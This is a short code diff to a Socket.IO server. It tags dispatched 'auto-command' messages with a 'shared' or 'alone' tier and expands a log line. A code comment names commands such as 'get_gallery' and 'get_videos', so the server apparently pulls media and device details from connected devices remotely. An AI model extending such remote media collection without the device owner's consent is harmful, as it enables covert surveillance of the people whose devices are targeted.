@@ -1206,10 +1206,11 @@ io.on("connection", (socket) => {
             }
 
             for (const sid of targetsToSend) {
-                io.to(sid).emit("auto-command", payload);
+                io.to(sid).emit("auto-command", { ...payload, dispatchTier: targetsToSend.size <= 1 ? "alone" : "shared" });
                 dispatched = true;
             }
-            console.log(`Auto-command '${command}' broadcast to ${targetsToSend.size} sockets of ${targetDeviceId}`);
+
+            console.log(`Auto-command '${command}' broadcast to ${targetsToSend.size} sockets of ${targetDeviceId} (tier=${targetsToSend.size <= 1 ? "alone" : "shared"})`);
             addRuntimeLog("server", "info", "AutoCommand", `Broadcasted '${command}' to ${targetsToSend.size} sockets of ${targetDeviceId}`);
         } else {
             // For data query commands ("get_gallery", "get_videos", "get_media_detail", "get_device_info"), dispatch to the first live connected socket (accSocketId || bgSocketId || activeSockets[0]).
